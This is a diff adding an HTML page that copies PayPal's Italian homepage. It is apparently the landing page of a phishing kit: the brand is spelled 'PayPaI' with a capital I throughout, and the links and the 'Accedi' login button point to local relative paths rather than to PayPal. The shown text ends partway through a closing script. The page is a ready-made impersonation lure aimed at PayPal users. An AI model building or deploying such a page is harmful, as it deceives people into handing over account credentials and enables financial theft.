@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="it-IT" data-device-type="dedicated" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage indexeddb hashchange history draganddrop rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage applicationcache svg inlinesvg smil svgclippaths jsEnabled">
+ <head>
+  <link type="text/css" href="https://www.paypalobjects.com/eboxapps/css/72/e43e3738be2d47fd6830b572ad4cb48e7a083d.css" rel="stylesheet" />
+  <link type="text/css" href="https://www.paypalobjects.com/eboxapps/css/4d/35cfe97859c469711e78424db824ccff0699f9.css" rel="stylesheet" />
+  <link type="text/css" href="https://www.paypalobjects.com/eboxapps/css/b7/0b5cf58d998af8136eae19436e3848b043e966.css" rel="stylesheet" />
+  <!--
+	    	Script info: script: node, template:  , date: Oct 14, 2015 11:14:05 -07:00, country: IT, language: it
+	    	web version: 
+	    	content version: 
+	    	hostname : Xq4xnq4a72NqONdaYSt7FD/l77DXNpGnahlufTejcuYZSJvpgOjZjw
+	    	rlogid : rZJvnqaaQhLn%2FnmWT8cSUmR1G%2FXOGzg1b29TMfAlTtZKEN%2BrRaLfnj1ncteypPsfcahrqXmbnSQ_150678f24be
+	    -->
+  <title>
+   Pagare, trasferire e accettare pagamenti online con PayPaI
+  </title>
+  <!--
+
+$$$$$$$\                     $$$$$$$\           $$\
+$$  __$$\                    $$  __$$\          $$ |
+$$ |  $$ |$$$$$$\  $$\   $$\ $$ |  $$ |$$$$$$\  $$ |
+$$$$$$$  |\____$$\ $$ |  $$ |$$$$$$$  |\____$$\ $$ |
+$$  ____/ $$$$$$$ |$$ |  $$ |$$  ____/ $$$$$$$ |$$ |
+$$ |     $$  __$$ |$$ |  $$ |$$ |     $$  __$$ |$$ |
+$$ |     \$$$$$$$ |\$$$$$$$ |$$ |     \$$$$$$$ |$$ |
+\__|      \_______| \____$$ |\__|      \_______|\__|
+                   $$\   $$ |
+                   \$$$$$$  |
+                    \______/
+
+Now hiring @ https://jobs.paypal-corp.com
+
+-->
+  <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+  <meta content="NOODP" name="robots" />
+  <meta charset="UTF-8" />
+  <meta content="PayPaI" name="application-name" />
+  <meta content="name=My Account;action-uri=?cgi-bin/webscr?cmd=_account;icon-uri=https://www.paypalobjects.com/webstatic/icon/favicon.ico" name="msapplication-task" />
+  <meta content="name=Send Money;action-uri=?cgi-bin/webscr?cmd=_send-money-transfer&send_method=domestic;icon-uri=https://www.paypalobjects.com/webstatic/icon/favicon.ico" name="msapplication-task" />
+  <meta content="name=Request Money;action-uri=?webapps/mpp/requesting-payments;icon-uri=https://www.paypalobjects.com/webstatic/icon/favicon.ico" name="msapplication-task" />
+  <meta content="Pagare online, trasferire denaro, accettare carte, accettare pagamenti online." name="keywords" />
+  <meta content="Scopri come usare PayPaI, il metodo facile e sicuro per pagare ed accettare pagamenti online in pochi semplici passi e trasferire denaro a distanza." name="description" />
+  <link href="?home" rel="canonical" />
+  <meta content="summary" property="twitter:card" />
+  <meta content="@paypal" property="twitter:site" />
+  <meta content="?webapps/mpp/home" property="og:url" />
+  <meta content="website" property="og:type" />
+  <meta content="Pagare, trasferire e accettare pagamenti online con PayPaI" property="og:title" />
+  <meta content="https://www.paypalobjects.com/webstatic/icon/pp258.png" property="og:image" />
+  <meta content="Scopri come usare PayPaI, il metodo facile e sicuro per pagare ed accettare pagamenti online in pochi semplici passi e trasferire denaro a distanza." property="og:description" />
+  <link href="https://www.paypalobjects.com/webstatic/icon/pp144.png" sizes="144x144" rel="apple-touch-icon-precomposed" />
+  <link href="https://www.paypalobjects.com/webstatic/icon/pp114.png" sizes="114x114" rel="apple-touch-icon-precomposed" />
+  <link href="https://www.paypalobjects.com/webstatic/icon/pp72.png" sizes="72x72" rel="apple-touch-icon-precomposed" />
+  <link href="https://www.paypalobjects.com/webstatic/icon/pp64.png" rel="apple-touch-icon-precomposed" />
+  <link href="https://www.paypalobjects.com/webstatic/icon/pp196.png" sizes="196x196" rel="shortcut icon" />
+  <link href="https://www.paypalobjects.com/webstatic/icon/favicon.ico" type="image/x-icon" rel="shortcut icon" />
+  <link href="https://www.paypalobjects.com/webstatic/icon/pp32.png" type="image/x-icon" rel="icon" />
+  <link href="https://www.paypalobjects.com/" rel="dns-prefetch" />
+  <meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui" name="viewport" />
+  <script type="application/ld+json">
+   {
+  "@context": "http://schema.org/",
+  "@type": "Organization",
+  "url": "https://www.paypal.com/",
+  "logo": "https://www.paypalobjects.com/webstatic/i/logo/rebrand/ppcom.png"
+  }
+  </script>
+  <!--[if IE 8 ]>
+ <script src="https://www.paypalobjects.com/eboxapps/js/0d/d056209362e0d90abada2b39c6846b5ddc8953.js"></script> 
+<![endif]-->
+  <script>
+   if (self === top || /paypal\.com$/.test(window.parent.location.hostname)) {var antiClickjack = document.getElementById("antiClickjack");if (antiClickjack) {antiClickjack.parentNode.removeChild(antiClickjack);}} else {top.location = self.location;}
+  </script>
+ </head>
+ <body>
+  <div id="body">
+   <section class="row-fluid row-notification cookie-notification light" style="display: block;">
+    <div class="containerCentered">
+     <div class="span12">
+      <p>
+       Utilizzando www.paypal.it, accetti il nostro uso dei
+       <a href="?webapps/mpp/ua/cookie-full">
+        cookie
+       </a>
+       , per una tua migliore esperienza di navigazione.
+       <a title="Close" role="button" class="notification-close" id="cookie-alert-close" href="#Close">
+        <span class="accessAid">
+         Close
+        </span>
+       </a>
+      </p>
+     </div>
+    </div>
+   </section>
+   <div class="moving-background-container container-fixed" id="fixed-top" style="display: block; height: 325px;">
+    <header role="banner" class="table-row" style="display: block;">
+     <div style="display: block;">
+      <div class="containerCentered ">
+       <a role="button" id="menu-button" href="#Menu">
+        Menu
+       </a>
+       <a class="paypal-img-logo" href="?webapps/mpp/home">
+        PayPaI
+       </a>
+       <nav role="navigation" id="main-menu">
+        <ul>
+         <li>
+          <a aria-controls="submenu-buy" rel="menuitem" id="header-buy" href="?webapps/mpp/home" role="button" aria-expanded="false">
+           Acquista
+          </a>
+          <div aria-labelledby="header-Acquista" id="submenu-Acquista" class="menu-wrapper" role="region" tabindex="-1">
+           <ul class="subnav list " id="header-Acquista-menu">
+            <li>
+             <a href="?webapps/mpp/pay-on-ebay">
+              Compra su eBay
+             </a>
+            </li>
+            <li>
+             <a href="?webapps/mpp/pay-online">
+              Acquista online
+             </a>
+            </li>
+            <li>
+             <a href="?webapps/mpp/pay-with-app">
+              Acquista in mobilità
+             </a>
+            </li>
+            <li>
+             <a href="?webapps/mpp/about-paypal-products">
+              Altre opzioni
+             </a>
+            </li>
+           </ul>
+          </div>
+         </li>
+         <li>
+          <a aria-controls="submenu-sell" rel="menuitem" id="header-sell" href="?webapps/mpp/merchant" role="button" aria-expanded="false">
+           Vendi
+          </a>
+          <div aria-labelledby="header-Vendi" id="submenu-Vendi" class="menu-wrapper" role="region" tabindex="-1">
+           <ul class="subnav list " id="header-Vendi-menu">
+            <li>
+             <a href="?webapps/mpp/accept-payments-online">
+              Ricevi pagamenti sul tuo sito
+             </a>
+            </li>
+            <li>
+             <a href="?webapps/mpp/email-invoice">
+              Ricevi pagamenti via email
+             </a>
+            </li>
+            <li>
+             <a href="?webapps/mpp/requesting-payments">
+              Ricevi denaro
+             </a>
+            </li>
+           </ul>
+          </div>
+         </li>
+         <li>
+          <a aria-controls="submenu-send" class="desktop-only" rel="menuitem" id="header-send" href="?webapps/mpp/send-money-online" role="button" aria-expanded="false">
+           Invia
+          </a>
+          <div aria-labelledby="header-send" id="submenu-send" class="menu-wrapper light" role="region" tabindex="-1">
+           <div class="menu subnav light" id="header-send-menu">
+            <form action="" data-flow-type="8ball" novalidate="novalidate" id="header-send-money-form" class="form-inline form-stepper 8ball" method="get">
+             <div data-step="step" id="send-money-step-1" class="step shown">
+              <div>
+               <strong class="headline medium">
+                Invia denaro in pochi clic
+               </strong>
+               <a class="learn-more-link contentLink" href="?webapps/mpp/send-money-online">
+                Scopri di più
+               </a>
+              </div>
+              <div class="controls">
+               <div class="input-wrapper">
+                <input type="text" autocorrect="off" autocapitalize="off" required="required" placeholder="Email o cellulare del destinatario" id="recipient" name="recipient" class="emailf" />
+                <label class="accessAid" for="recipient">
+                 Indirizzo email
+                </label>
+               </div>
+              </div>
+              <div class="controls">
+               <div class="input-wrapper caboose">
+                <label class="accessAid" for="amount_send">
+                 Importo da inviare
+                </label>
+                <input type="number" maxlength="17" required="required" autocorrect="off" autocapitalize="off" placeholder="Importo" id="amount_send" name="amount" min="0" class="amount-currency" />
+                <select name="currencyCode" id="currency_code" class="currency no-arrow required">
+                 <option value="EUR">
+                  EUR
+                 </option>
+                 <option value="AUD">
+                  AUD
+                 </option>
+                 <option value="BRL">
+                  BRL
+                 </option>
+                 <option value="CAD">
+                  CAD
+                 </option>
+                 <option value="CHF">
+                  CHF
+                 </option>
+                 <option value="CZK">
+                  CZK
+                 </option>
+                 <option value="DKK">
+                  DKK
+                 </option>
+                 <option value="GBP">
+                  GBP
+                 </option>
+                 <option value="HKD">
+                  HKD
+                 </option>
+                 <option value="HUF">
+                  HUF
+                 </option>
+                 <option value="ILS">
+                  ILS
+                 </option>
+                 <option value="JPY">
+                  JPY
+                 </option>
+                 <option value="MXN">
+                  MXN
+                 </option>
+                 <option value="MYR">
+                  MYR
+                 </option>
+                 <option value="NOK">
+                  NOK
+                 </option>
+                 <option value="NZD">
+                  NZD
+                 </option>
+                 <option value="PHP">
+                  PHP
+                 </option>
+                 <option value="PLN">
+                  PLN
+                 </option>
+                 <option value="SEK">
+                  SEK
+                 </option>
+                 <option value="SGD">
+                  SGD
+                 </option>
+                 <option value="THB">
+                  THB
+                 </option>
+                 <option value="TRY">
+                  TRY
+                 </option>
+                 <option value="TWD">
+                  TWD
+                 </option>
+                 <option value="USD">
+                  USD
+                 </option>
+                </select>
+                <label class="select-arrow" for="currency_code">
+                 Valuta
+                </label>
+               </div>
+              </div>
+              <input type="button" class="btn continue" value="Continua" />
+             </div>
+             <div data-step="submit" id="send-money-step-2" class="step">
+              <div class="button-choices">
+               <div class="choice">
+                <strong class="headline medium">
+                 Invia denaro a familiari e amici
+                </strong>
+                <p id="choice-1">
+                 Inviare denaro ad amici e familiari in euro è gratuito se usi il saldo PayPaI.
+                </p>
+                <button data-url="https://www.paypal.com/myaccount/transfer/send/external" aria-describedby="choice-1" data-step="submit" class="btn gift" value="Gift" name="payment_type" type="submit">
+                 Familiari o amici
+                </button>
+               </div>
+               <div class="choice">
+                <strong class="headline medium">
+                 Acquista beni o servizi
+                </strong>
+                <p id="choice-2">
+                 Per te è gratis. Il venditore paga una tariffa per ricevere il pagamento. Inoltre sei coperto dalla
+                 <a href="?webapps/mpp/paypal-safety-and-security">
+                  Protezione acquisti
+                 </a>
+                 .
+                </p>
+                <button data-url="https://www.paypal.com/myaccount/transfer/buy/external" aria-describedby="choice-2" data-step="submit" class="btn goods" value="Goods" name="payment_type" type="submit">
+                 Beni o servizi
+                </button>
+               </div>
+              </div>
+             </div>
+            </form>
+           </div>
+          </div>
+         </li>
+         <li>
+          <a class="no-drop" id="header-business" href="?webapps/mpp/merchant">
+           Business
+          </a>
+         </li>
+        </ul>
+        <ul class="sublist">
+         <li>
+          <a aria-label="" title="" class="search-icon" href="?cgi-bin/webscr?cmd=_sitewide-search">
+           Ricerca
+          </a>
+         </li>
+         <li>
+          <a id="menu-sublist-help" href="?cgi-bin/webscr?cmd=_help">
+           Aiuto
+          </a>
+         </li>
+         <li>
+          <a id="menu-sublist-contact" href="?cgi-bin/webscr?cmd=_contact-phone">
+           Contattaci
+          </a>
+         </li>
+        </ul>
+       </nav>
+       <div id="header-buttons">
+        <a class="btn btn-secondary btn-small" id="ul-btn" href="webscr?cmd=_login-run&dispatch=96a34489f03cb88fcdd368b8ae501c7e?country.x=IT&locale.x=it_IT">
+         Accedi
+        </a>
+        <a class="btn btn-small btn-signup" name="SignUp_header" id="signup-button" href="?signup/account">
+         Registrati
+        </a>
+       </div>
+      </div>
+     </div>
+    </header>
+    <section class="row-fluid hero hero-fixed dark " id="alt" style="height: 197px;">
+     <div class="hero-bg moving-background filler hero-video-still playing video-loaded" id="hero">
+      <div class="containerCentered containerMobileFullWidth">
+       <div class="vertical-centered text-center center-text center-block">
+        <div class="hero-headline">
+         <h1 class="headline-dark">
+          Hai cambiato modo di fare shopping.
+         </h1>
+        </div>
+        <div class="hero-subheadline">
+         <span class="headline-light">
+          Cambia anche il modo di pagare online.
+         </span>
+        </div>
+        <div class="hero-cta">
+         <a class="btn" href="?signup/account">
+          Registrati gratis
+         </a>
+        </div>
+       </div>
+      </div>
+      <div class="novideo-bg ">
+      </div>
+      <video poster="https://www.paypalobjects.com/webstatic/en_GB/mktg/wright/videos/uk-brand-campaign.jpg" muted="muted" autoplay="autoplay" style="width: 1028px; height: auto; visibility: visible;">
+       <source type="video/mp4" src="https://www.paypalobjects.com/webstatic/en_GB/mktg/wright/videos/uk-brand-campaign.mp4">
+       </source>
+       <source type="video/webm" src="https://www.paypalobjects.com/webstatic/en_GB/mktg/wright/videos/uk-brand-campaign.webm">
+       </source>
+      </video>
+      <a class="mb-button play" href="#Play" role="button">
+       In pausa. Clicca per continuare.
+      </a>
+      <a class="mb-button pause" href="#Pausa" role="button">
+       Pausa
+      </a>
+     </div>
+    </section>
+    <div class="table-row hugger-row" style="display: block;">
+     <div class="hero-hugger" style="display: block;">
+      <div class="containerCentered">
+       <ul class="pull-left button-menu">
+        <li>
+         <a title="Aiuto" class="icon help" href="?cgi-bin/webscr?cmd=_help">
+          Aiuto
+         </a>
+        </li>
+        <li>
+         <a title="Contattaci" class="icon contact" href="?cgi-bin/webscr?cmd=_contact-phone">
+          Contattaci
+         </a>
+        </li>
+        <li>
+         <a aria-label="Cerca" title="Cerca" class="icon search" href="?cgi-bin/webscr?cmd=_sitewide-search">
+          Cerca
+         </a>
+        </li>
+       </ul>
+       <div class="country-selector ">
+        <a class="country italy" title="See all countries" href="?webapps/mpp/country-worldwide">
+         See all countries
+        </a>
+       </div>
+       <a title="There's more below" id="hugger-arrow" class="fancy-down-arrow-grey" href="#n1">
+        Scroll to next panel
+       </a>
+      </div>
+     </div>
+    </div>
+   </div>
+   <div class="containerMobileFullWidth" id="main" role="main">
+    <section id="n1" class="row row-fluid editorial editorial-left ">
+     <div class="container containerCentered">
+      <div class="col-sm-6 span6 col-sm-offset6 editorial-container editorial-text">
+       <div class="editorial-cell">
+        <h2 class="h3 large">
+         Semplice e veloce.
+        </h2>
+        <p class="contentPara">
+         Milioni di clienti usano PayPaI per un semplice motivo: è facile. Inserisci solo email e password e in pochi clic il pagamento è completato.
+        </p>
+        <a href="?webapps/mpp/pay-on-ebay" class="contentLink">
+         Compra su eBay
+        </a>
+        <a href="?webapps/mpp/pay-online" class="contentLink">
+         Fai shopping online
+        </a>
+       </div>
+      </div>
+      <div class="editorial-img col-sm-6 span6 editorial-container n1">
+      </div>
+     </div>
+    </section>
+    <section class="row row-fluid editorial editorial-left editorial-bg frs lightContent no-parallax">
+     <div data-translate-y-end="60" data-translate-y-start="-20" class="parallax-bg scroll-animate">
+     </div>
+     <div class="container containerCentered">
+      <div class="col-sm-6 span6 col-sm-offset6 editorial-container editorial-text">
+       <div class="editorial-cell">
+        <h2 class="h3 large">
+         Un articolo da restituire? Ti rimborsiamo le spese di reso.
+        </h2>
+        <p class="contentPara">
+         Se cambi idea dopo aver effettuato un acquisto online con PayPaI, le spese di reso ti vengono rimborsate*. Il servizio è gratuito, devi solo attivarlo una volta.
+        </p>
+        <a href="https://www.paypal.it/reso/" class="contentLink reverseLink">
+         Scopri di più
+        </a>
+        <p class="legal-notes">
+         * Vedi le
+         <a href="https://www.paypal.it/resocondizionigenerali/">
+          condizioni
+         </a>
+         .
+        </p>
+       </div>
+      </div>
+     </div>
+    </section>
+    <section class="row row-fluid editorial editorial-right editorial-bg n4  parallax">
+     <div data-translate-y-end="60" data-translate-y-start="-20" class="parallax-bg scroll-animate">
+     </div>
+     <div class="container containerCentered">
+      <div class="col-sm-6 span6 editorial-container editorial-text">
+       <div class="editorial-cell">
+        <h2 class="h3 large">
+         Esci in 2 e paga per 1 con la nostra prepagata.
+        </h2>
+        <p class="contentPara">
+         Con la Prepagata di PayPaI, per i prossimi 6 mesi la classica uscita pizza e cinema ti costa la metà: vai cena e paga solo per una persona, compra un biglietto e ne avrai un altro gratis*.
+        </p>
+        <a href="?webapps/mpp/prepaid" class="contentLink">
+         Richiedi la tua Prepagata di PayPaI
+        </a>
+        <p class="legal-notes">
+         *si applicano termini e condizioni.
+        </p>
+       </div>
+      </div>
+     </div>
+    </section>
+    <section class="row-fluid panel blue reverseLink">
+     <div class="containerCentered">
+      <div class="span6 ">
+       <h2 class="contentHead large h3">
+        Invia denaro a chi vuoi, dove vuoi.
+       </h2>
+       <p class="contentPara">
+        Invia denaro in qualsiasi angolo del mondo a chiunque abbia un’email o un numero di cellulare. Sarà felice di ricevere il tuo messaggio.
+       </p>
+       <a href="?webapps/mpp/send-money-online" class="contentLink">
+        Invia denaro
+       </a>
+      </div>
+      <div class="span6 ">
+       <h2 class="contentHead large h3">
+        Richiedi denaro in pochi clic.
+       </h2>
+       <p class="contentPara">
+        Richiedi denaro in modo semplice e veloce. Il destinatario potrà pagarti comodamente tramite saldo PayPaI o carta.
+       </p>
+       <a href="?webapps/mpp/requesting-payments" class="contentLink">
+        Richiedi denaro
+       </a>
+      </div>
+     </div>
+    </section>
+    <section class="row row-fluid editorial editorial-left ">
+     <div class="container containerCentered">
+      <div class="col-sm-6 span6 col-sm-offset6 editorial-container editorial-text">
+       <div class="editorial-cell">
+        <h2 class="h3 large">
+         Accettare le carte non è mai stato così facile.
+        </h2>
+        <p class="contentPara">
+         Vendi online? Inizia subito ad accettare le principali carte. Dall'inizio alla fine, pensiamo a tutto noi. Così puoi dedicarti ai tuoi clienti.
+        </p>
+        <a href="?webapps/mpp/accept-payments-online" class="contentLink">
+         Accetta pagamenti online
+        </a>
+        <a href="?webapps/mpp/email-invoice" class="contentLink">
+         Ricevi pagamenti via email
+        </a>
+       </div>
+      </div>
+      <div class="editorial-img col-sm-6 span6 editorial-container n3">
+      </div>
+     </div>
+    </section>
+    <section class="row-fluid panel light center-text">
+     <div class="containerCentered">
+      <div class="span12">
+       <p class="closingHeadline headline large">
+        Semplificati la vita.
+       </p>
+       <a href="?signup/account" class="btn closing-cta center-block span4">
+        Registrati gratis
+       </a>
+      </div>
+     </div>
+    </section>
+   </div>
+   <footer class="global-footer" role="contentinfo">
+    <div class="containerCentered containerExtend">
+     <ul class="footer-main secondaryLink">
+      <li>
+       <a href="?cgi-bin/helpweb?cmd=_help">
+        Aiuto
+       </a>
+      </li>
+      <li>
+       <a href="?cgi-bin/webscr?cmd=_help&t=escalateTab">
+        Contattaci
+       </a>
+      </li>
+      <li>
+       <a href="?webapps/mpp/paypal-fees">
+        Tariffe
+       </a>
+      </li>
+      <li>
+       <a href="?webapps/mpp/paypal-safety-and-security">
+        Sicurezza
+       </a>
+      </li>
+      <li>
+       <a href="https://www.paypal.it/acquisti/Offers/">
+        Shopping
+       </a>
+      </li>
+      <li class="country-selector ">
+       <a class="country italy" title="See all countries" href="?webapps/mpp/country-worldwide">
+        See all countries
+       </a>
+      </li>
+      <li class="footer-search">
+       <a aria-label="Cerca" title="Cerca" class="search-icon" href="?cgi-bin/webscr?cmd=_sitewide-search">
+        Cerca
+       </a>
+      </li>
+     </ul>
+     <ul class="footer-secondary secondaryLink">
+      <li>
+       <a target="_blank" href="?webapps/mpp/about">
+        Chi siamo
+       </a>
+      </li>
+      <li>
+       <a target="_blank" href="https://jobs.paypal-corp.com">
+        Lavora con noi
+       </a>
+      </li>
+      <li>
+       <a href="https://developer.paypal.com/">
+        Sviluppatori
+       </a>
+      </li>
+      <li>
+       <a target="_blank" href="https://www.paypal-marketing.com/emarketing/partner/cemea/program-it/index.html">
+        Partner
+       </a>
+      </li>
+     </ul>
+     <ul class="footer-tertiary secondaryLink">
+      <li id="footer-copyright">
+       © 1999–2015
+      </li>
+      <li id="footer-privacy">
+       <a href="?webapps/mpp/ua/privacy-full">
+        Privacy
+       </a>
+      </li>
+      <li class="footer-legal">
+       <a href="?webapps/mpp/ua/legalhub-full">
+        Accordi legali
+       </a>
+      </li>
+      <li class="" id="siteFeedback">
+       <script>
+        var feedback_link = '';
+		
+			feedback_link="Feedback";
+		
+		var PAYPAL = PAYPAL ? PAYPAL : {};
+		PAYPAL.opinionLabVars = {
+			'siteCatalystPageName' 		: '',
+			'siteCatalystC7' 			: '',
+			'siteCatalystAccountNumber' : '',
+			'feedback_link' 			: feedback_link,
+			'isPaymentFlow' 			: false,
+			'isSiteRedirect' 			: false,
+			'languageCode' 				: 'it',
+			'countryCode' 				: 'IT',
+			'serverName' 				: 'www.paypal.com',
+			'commentCardCmd' 			: '',
+			'accountNumber'				: '',
+			'miniBrowser'				: false,
+			'sitefb_plus_icon'			: 'https://www.paypalobjects.com/en_US/i/scr/sm_333_oo.gif',
+			'rLogId'					: escape('rZJvnqaaQhLn%2FnmWT8cSUmR1G%2FXOGzg1b29TMfAlTtZKEN%2BrRaLfnj1ncteypPsfcahrqXmbnSQ_150678f24be'),
+			'showSitefbIcon'			: false
+		};
+       </script>
+       <a href="#">
+        Feedback
+       </a>
+      </li>
+     </ul>
+    </div>
+   </footer>
+  </div>
+  <script>
+   var PP_GLOBAL_JS_STRINGS = {
+        "CLOSE": "Close",
+        "TOGGLE_FULL_SCREEN": "Schermo intero",
+        "NO_PLAY_VIDEO": "Impossibile mostrare il video con il tuo browser.",
+        "CLICK_TO_PLAY": "In pausa. Clicca per continuare.",
+        "PLAY": "Play",
+        "PAUSE": "Pausa",
+        "PLAY_OR_PAUSE": "Vedi o metti in pausa",
+        "MUTE": "Silenzioso",
+        "SEEK_VIDEO": "Vai a un\&amp;#39;altra scena del video",
+
+        "MESSAGE_REQUIRED": "Campo obbligatorio",
+        "MESSAGE_REMOTE": "Please fix this field",
+        "MESSAGE_EMAIL": "Inserisci un indirizzo email valido",
+        "MESSAGE_EMAIL_OR_PHONE": "Inserisci un indirizzo email o un numero di telefono valido",
+        "MESSAGE_URL": "Please enter a valid URL",
+        "MESSAGE_DATE": "Please enter a valid date",
+        "MESSAGE_DATEISO": "Please enter a valid date (ISO)",
+        "MESSAGE_NUMBER": "Deve essere un numero",
+        "MESSAGE_DIGITS": "Please enter only digits",
+        "MESSAGE_CREDITCARD": "Please enter a valid credit card number",
+        "MESSAGE_EQUALTO": "Your passwords don't match. Please retype your password to confirm it.",
+        "MESSAGE_ACCEPT": "Please enter a value with a valid extension",
+        "MESSAGE_MAXLENGTH": "Please enter no more than {0} characters",
+        "MESSAGE_MINLENGTH": "Please enter at least {0} characters",
+        "MESSAGE_RANGELENGTH": "Please enter a value between {0} and {1} characters long",
+        "MESSAGE_RANGE": "Please enter a value between {0} and {1}",
+        "MESSAGE_MAX": "Please enter a value less than or equal to {0}",
+        "MESSAGE_MIN": "Please enter a value greater than or equal to {0}",
+        "MESSAGE_BADPHONE": "Non è possibile inviare denaro a questo numero. Prova con un indirizzo email. "
+    };
+
+    var HOLIDAYS = '';
+  </script>
+  <script src="https://www.paypalobjects.com/eboxapps/js/35/1418cf95f5a7d95573f6cd544fd7e421da50c5.js">
+  </script>
+  <!--[if lte IE 9]>
+         <script src="https://www.paypalobjects.com/eboxapps/js/b2/f34e53f94c2a6fb2a579294142f824ea64fad5.js"></script> 
+        <![endif]-->
+  <script>
+   var dataLayer = {
+
+        
+        contentCountry: 'IT'.toLowerCase(),
+
+        
+        contentLanguage: 'it'.toLowerCase(),
+
+        
+        localTimeZone: '',
+
+        
+        localTime: (new Date()).toString(),
+
+        
+        fptiGuid: '',
+
+        
+        gaCid: '',
+
+        
+        gaUid: ''
+    };
+  </script>
+  <script src="https://www.paypalobjects.com/tagmgmt/bs.js">
+  </script>
+  <script src="https://www.paypalobjects.com/eboxapps/js/47/6157384745daccf4e6e410f49204b0f8b61fc9.js">
+  </script>
+  <script>
+   // Setup video. Switch based on whether they are logged in
+        
+            new PAYPAL.Marketing.MovingBackground('#hero');
+        
+
+        $(function() {
+            /* GA: Track Signup Button. */
+            $("[name=SignUp_consumer_hero]").on('mousedown', function (e) {
+                if (typeof ga !== 'undefined' &amp;&amp; ga !== null) ga('send', 'event', 'MPP Sign-Up Button', 'Hero', 'IT Homepage');
+            });
+        });
+  </script>
+  <script src="//www.paypalobjects.com/js/site_catalyst/pp_jscode_080706.js">
+  </script>
+  <script>
+   s.prop71="Nodejs";
+				s.prop40="35b63be6b2189";
+				s.prop20="Unknown";
+				s.prop50="it_IT";
+				s.prop1="home.dust";
+				s.psps="pp.10,pp.26,pp.27,pp.84,pp.162,pp.182,pp.197";
+				s.eVar72="uqe=|uqt=|uqc=|xe=1394|xt=3198";
+				s.prop14="";
+				s.prop28="Unknown";
+				s.prop29="";
+				s.prop36="https://www.paypal.com/webapps/mpp/home";
+				s.prop30="it";
+				s.server="main";
+				s.channel="mktg";
+				ContentTask="home";
+				s.prop51="";
+				s.prop31="personal";
+				subFeature2="";
+				s.prop43="Unknown";
+				s.prop37="";
+				s.prop35="out";
+				s.pageName="main:mktg:personal::home";
+				s.prop25="main:mktg:personal::home:::3198";
+				s.eVar25="main:mktg:personal::home:::3198";
+				s.hier1="main_mktg_personal_";
+				s.events="";
+				s.products="";
+				s.eVar3="";
+  </script>
+  <script>
+   &lt;!--	
+				/************ DO NOT ALTER ANYTHING BELOW THIS LINE ! *************/
+				 function scOnload(){
+				 	var s_code=s.t();
+				 	if(s_code)document.write(s_code);
+				 }
+				 
+				 	if (window.addEventListener){
+						window.addEventListener('load',scOnload,false);
+					 } else if (window.attachEvent){
+						window.attachEvent('onload', scOnload);
+					 };
+				 
+				 if(navigator.appVersion.indexOf('MSIE')&gt;=0)document.write(unescape('%3C')+'\!-'+'-')
+			 //--&gt;
+  </script>
+  <noscript>
+   &lt;img src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript" alt="" height="1" width="1" border="0"&gt;
+  </noscript>
+  <!-- DO NOT REMOVE THIS COMMENT -->
+  <!-- End SiteCatalyst Code -->
+  <script src="//www.paypalobjects.com/pa/js/pa.js">
+  </script>
+  <script>
+   (function(){
+                    var callFpti = function(fptiDataString) {
+                        PAYPAL.core.pta = PAYPAL.analytics.setup({data:fptiDataString, url:'\/\/t.paypal.com\/ts'});
+                    }
+
+					if(typeof PAYPAL.analytics != "undefined"){
+
+                        PAYPAL.core = PAYPAL.core || {};
+
+                        var  fptiDataString = 'pgrp=main%3Amktg%3Apersonal%3A%3Ahome&amp;page=main%3Amktg%3Apersonal%3A%3Ahome%3A%3A%3A3198&amp;qual=&amp;tmpl=home.dust&amp;pgst=Unknown&amp;lgin=out&amp;vers=&amp;calc=35b63be6b2189&amp;rsta=it_IT&amp;pgtf=&amp;s=ci&amp;ccpg=it&amp;csci=d168b11b8aee4d54baf1783ad94b00b1&amp;goal=&amp;fltp=&amp;flnm=&amp;erpg=&amp;erfd=&amp;eccd=&amp;cust=&amp;acnt=&amp;aver=&amp;rstr=&amp;pfid=&amp;bztp=&amp;mbtp=&amp;pxpguid=678f25011500a1028806c2dbff11357b&amp;psps=pp.10%2Cpp.26%2Cpp.27%2Cpp.84%2Cpp.162%2Cpp.182%2Cpp.197&amp;xe=1394&amp;xt=3198&amp;pgld=Unknown&amp;bzsr=main&amp;bchn=mktg&amp;pgsf=personal&amp;shir=main_mktg_personal_&amp;pros=3&amp;ptnr=&amp;lgcook=0';
+
+                        
+                        if (typeof ga !== 'undefined' &amp;&amp; ga !== null) {
+                            ga(function(tracker) {
+                              var gaClientId = tracker.get('clientId');
+                              if (gaClientId) {
+                                fptiDataString += "&amp;gacook=" + gaClientId;
+                              }
+                              callFpti(fptiDataString);
+                            });
+                        }
+                        else {
+                            callFpti(fptiDataString);
+                        }
+					}
+				}());
+  </script>
+  <noscript>
+   &lt;img src="https://t.paypal.com/ts?nojs=1&amp;pgrp=main%3Amktg%3Apersonal%3A%3Ahome&amp;page=main%3Amktg%3Apersonal%3A%3Ahome%3A%3A%3A3198&amp;qual=&amp;tmpl=home.dust&amp;pgst=Unknown&amp;lgin=out&amp;vers=&amp;calc=35b63be6b2189&amp;rsta=it_IT&amp;pgtf=&amp;s=ci&amp;ccpg=it&amp;csci=d168b11b8aee4d54baf1783ad94b00b1&amp;goal=&amp;fltp=&amp;flnm=&amp;erpg=&amp;erfd=&amp;eccd=&amp;cust=&amp;acnt=&amp;aver=&amp;rstr=&amp;pfid=&amp;bztp=&amp;mbtp=&amp;pxpguid=678f25011500a1028806c2dbff11357b&amp;psps=pp.10%2Cpp.26%2Cpp.27%2Cpp.84%2Cpp.162%2Cpp.182%2Cpp.197&amp;xe=1394&amp;xt=3198&amp;pgld=Unknown&amp;bzsr=main&amp;bchn=mktg&amp;pgsf=personal&amp;shir=main_mktg_personal_&amp;pros=3&amp;ptnr=&amp;lgcook=0" alt="" height="1" width="1" border="0"&gt;
+  </noscript>
+  <script>
+   $(document).ready(function(){
+        if(window.console || "console" in window) {
+            console.log("%c WARNING!!!", "color:#FF8F1C; font-size:40px;");
+            console.log("%c This browser feature is for developers only. Please do not copy-paste any code or run any scripts here. It may cause your PayPaI account to be compromised.", "color:#003087; font-size:12px;");
+            console.log("%c For more information, http://en.wikipedia.org/wiki/Self-XSS", "color:#003087; font-size:12px;");
